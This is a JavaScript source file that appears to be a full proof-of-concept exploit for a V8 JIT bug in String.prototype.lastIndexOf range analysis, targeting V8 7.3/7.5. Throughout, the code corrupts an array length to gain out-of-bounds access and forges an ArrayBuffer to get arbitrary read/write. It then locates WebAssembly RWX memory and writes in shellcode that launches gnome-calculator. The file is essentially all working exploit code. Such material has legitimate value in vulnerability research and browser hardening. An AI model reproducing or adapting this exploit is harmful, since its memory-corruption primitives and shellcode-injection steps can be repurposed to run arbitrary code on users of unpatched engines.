// spawn gnome calculator
let shellcode = [0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x59, 0x49, 0x81, 0xe9, 0x05, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x01, 0x00, 0x00, 0xbf, 0x6b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb1, 0x61, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x20, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8, 0x51, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x8d, 0xb9, 0x62, 0x00, 0x00, 0x00, 0xb8, 0xa1, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb9, 0x64, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x49, 0x8d, 0x91, 0x7e, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x52, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xeb, 0xfe, 0x2e, 0x2e, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00];

let version = this.version().split(" ")[0];

let jump_table_start_offset = {
  "7.3.0" : 31,
  "7.5.0" : 17 // this corresponds to a patch v8 version ;-)
}

let WasmOffsets = { 
  shared_function_info : 3,
  wasm_exported_function_data : 1,
  wasm_instance : 2,
  jump_table_start :jump_table_start_offset[version]
};

let log = print;

let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let f2i = (f) => {
    fv[0] = f;
      return dv[0];
}

let i2f = (i) => {
    dv[0] = BigInt(i);
      return fv[0];
}

let tagFloat = (f) => {
  fv[0] = f;
  dv[0] += 1n;
  return fv[0];
}

let hexprintablei = (i) => {
    return (i).toString(16).padStart(16,"0");
}

let assert = (l,r,m) => {
  if (l != r) {
    log(hexprintablei(l) + " != " +  hexprintablei(r));
    log(m);
    throw "failed assert";
  }
  return true;
}

SUCCESS = 0;
FAILURE = 1;

FMARK = i2f(0xDEADDEAE); // lsb must be set to 0!
FTAGGEDBACKINGSTORE = i2f(0x4242);

fSIZE = i2f(0x0000020000000000);
SIZE = 0x200

AB_SIZE = 0x2000;

let PTR_SIZE = 8;

let MARK1SMI = 0x13;
let MARK2SMI = 0x37;
let MARK1 = 0x0000001300000000;
let MARK2 = 0x0000003700000000;

const str = "____"+"DOARE".repeat(214748359);

function opt_me() {
  const OOB_OFFSET = 5;
  let idx = String.prototype.lastIndexOf.call(str, ''); // JSCall | Range(-1, 1073741798)
  let val = Math.abs(Math.abs(idx) + 25);  // specific to 64-bit
  val = val >> 30;
  val = val * OOB_OFFSET;
  let leak = 0;
  if (val >= OOB_OFFSET) // will get optimized out
    leak = 0;
  else {
    let arr = new Array(1.1,1.1);
    arr2 = new Array(FMARK, FMARK);
    arr3 = new Array(MARK1SMI, Math, MARK2SMI, get_pwnd);
    leak = arr[val];
    arr[val] = fSIZE;
    if (leak != 1.1 && leak != 0 && leak != undefined) {

      // [1] we are ready to corrupt arr.length
      
      log("[+] Corrupted length of arr : " + arr.length);
      assert(arr.length, SIZE);
      log("[+] Got OOB R/W");

      // [2] put an ArrayBuffer structure to leak

      let evil_ab = new ArrayBuffer(AB_SIZE);
      let ab_len_idx = arr.indexOf(i2f(AB_SIZE));
      assert(ab_len_idx != -1, true, "could not find array buffer");
      assert(Number(f2i(arr[ab_len_idx + 1])) & 1, false, "unexpected array buffer layout");
      assert(Number(f2i(arr[ab_len_idx + 1])) > 0x10000, true, "unexpected array buffer layout");
      assert(f2i(arr[ab_len_idx + 2]), 2, "unexpected array buffer layout");

      let ibackingstore_ptr = f2i(arr[ab_len_idx + 1]);
      let fbackingstore_ptr = arr[ab_len_idx + 1];

      log("[+] Found backingstore pointer : " + hexprintablei(ibackingstore_ptr));

      // [3] copy the array buffer so as to prepare a good looking fake array buffer
     
      let view = new BigUint64Array(evil_ab);
      for (let i = 0; i < AB_SIZE / PTR_SIZE; ++i) {
        view[i] = f2i(arr[ab_len_idx-3+i]);
      }

      log("[+] Prepared fake array buffer");

      // [4] corrupt arr3[1]. We wan't to replace the pointer to the Math object
      // by a (tagged) pointer to the array buffer's backing_store

      let magic_mark_idx = arr.indexOf(i2f(MARK1));
      assert(magic_mark_idx != -1, true, "could not find object pointer mark");
      assert(f2i(arr[magic_mark_idx+2]) == MARK2, true);
      arr[magic_mark_idx+1] = tagFloat(fbackingstore_ptr);

      log("[+] Got arbitrary Read/Write");
      
      // [5] leak wasm function pointer
      
      let ftagged_wasm_func_ptr = arr[magic_mark_idx+3]; // we want to read get_pwnd

      view[4] = f2i(ftagged_wasm_func_ptr) - 1n;

      // [6] use RW primitive to read WASM structures
      
      log("[+] Looking for WASM RWX memory");

      let rw_view = new BigUint64Array(arr3[1]);
      let shared_function_info = rw_view[WasmOffsets.shared_function_info];
      view[4] = shared_function_info - 1n; // detag pointer

      rw_view = new BigUint64Array(arr3[1]);
      let wasm_exported_function_data = rw_view[WasmOffsets.wasm_exported_function_data];
      view[4] = wasm_exported_function_data - 1n; // detag

      rw_view = new BigUint64Array(arr3[1]);
      let wasm_instance = rw_view[WasmOffsets.wasm_instance];
      view[4] = wasm_instance - 1n; // detag

      // [7] RWX memory is pointed to by the jumpTableStart field

      rw_view = new BigUint64Array(arr3[1]);
      let jump_table_start = rw_view[WasmOffsets.jump_table_start]; // detag

      assert(jump_table_start > 0x10000n, true);
      assert(jump_table_start & 0xfffn, 0n); // should look like an aligned pointer

      log("[+] found RWX memory at 0x" + jump_table_start.toString(16));

      view[4] = jump_table_start;
      rw_view = new Uint8Array(arr3[1]);

      // [8] write shellcode in RWX memory
      
      for (let i = 0; i < shellcode.length; ++i) {
        rw_view[i] = shellcode[i];
      }

      // [9] execute arbitrary code
      
      let res = get_pwnd();

      return SUCCESS;
    }
  }
  return FAILURE;
}

(() => {
  assert(this.alert, undefined);
  assert(jump_table_start_offset[version] != undefined, true, "unsupported version");
  // architecture expected to be 64-bit
})()

load("wasm.js");

for (var i = 0; i < 0x10000; ++i) {
  var ret = opt_me();
  if (ret == SUCCESS)
    break;
}
